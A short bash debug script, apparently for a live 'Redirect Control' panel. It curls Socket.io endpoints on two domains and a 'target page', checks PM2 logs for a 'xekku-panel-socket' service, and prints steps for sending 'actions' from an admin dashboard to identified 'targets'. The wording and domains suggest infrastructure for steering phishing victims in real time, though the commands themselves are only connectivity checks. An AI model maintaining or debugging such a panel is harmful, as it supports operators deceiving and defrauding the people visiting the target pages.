#!/bin/bash

echo "==================================="
echo "   Redirect Control Debug Test     "
echo "==================================="

echo "🔍 Testing Socket.io connectivity..."

# Test main domain Socket.io
echo "--- Testing main domain Socket.io connection ---"
curl -I "https://cbinfodesk.shop/socket.io/" 2>/dev/null | head -1

# Test connected domain Socket.io  
echo "--- Testing connected domain Socket.io connection ---"
curl -I "http://stephenhawkinswheelchair.fun/socket.io/" 2>/dev/null | head -1

echo ""
echo "🔧 Checking PM2 services..."
pm2 status

echo ""
echo "📡 Checking Socket.io server logs..."
echo "Recent Socket.io logs:"
pm2 logs xekku-panel-socket --lines 10

echo ""
echo "🌐 Testing target page accessibility..."
curl -I "http://stephenhawkinswheelchair.fun/?id=dXNlcg==" 2>/dev/null | head -1

echo ""
echo "🎯 Debug Instructions:"
echo "1. Open target page: http://stephenhawkinswheelchair.fun/?id=dXNlcg=="
echo "2. Open browser dev tools (F12) → Console tab"
echo "3. Check for Socket.io connection messages"
echo "4. Open dashboard: https://cbinfodesk.shop/admin/dashboard → Live Control"
echo "5. Try sending an action and watch console logs"
echo ""
echo "Expected logs on target page:"
echo "  ✅ 'Connecting to Socket.io at: http://stephenhawkinswheelchair.fun'"
echo "  ✅ 'Connected to Socket.io server'"
echo "  ✅ 'Target identified: {targetID: \"...\"}'"
echo "  ✅ 'Received action: {action: \"...\"}'"
echo ""
echo "If no logs appear, run: pm2 restart all"